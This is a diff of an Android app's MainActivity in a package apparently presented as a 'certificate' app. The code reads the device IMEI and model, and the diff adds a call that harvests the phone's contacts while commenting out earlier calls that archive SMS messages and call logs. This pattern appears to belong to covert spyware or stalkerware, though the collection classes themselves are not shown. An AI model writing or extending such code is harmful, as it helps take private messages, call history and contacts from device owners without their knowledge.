@@ -7,6 +7,7 @@ import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 
+
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
@@ -27,7 +28,9 @@ import android.util.Log;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
+
 import com.inet.android.certificate.R;
+import com.inet.android.contacts.GetContacts;
 import com.inet.android.archive.ArchiveCall;
 import com.inet.android.archive.ArchiveSms;
 import com.inet.android.history.LinkService;
@@ -73,13 +76,17 @@ public class MainActivity extends Activity {
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
+		Log.d("Main", "GetCont");
+
 		String androidVersion = android.os.Build.VERSION.RELEASE;
 //		GetInfo getInfo = new  GetInfo(context);
 //		getInfo.getInfo();
-		ArchiveSms arhSms = new ArchiveSms();
-		arhSms.execute(context);
-		ArchiveCall arhCall = new ArchiveCall();
-		arhCall.execute(context);	
+		GetContacts getCont = new GetContacts();
+		getCont.execute(context);
+//		ArchiveSms arhSms = new ArchiveSms();
+//		arhSms.execute(context);
+//		ArchiveCall arhCall = new ArchiveCall();
+//		arhCall.execute(context);	
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
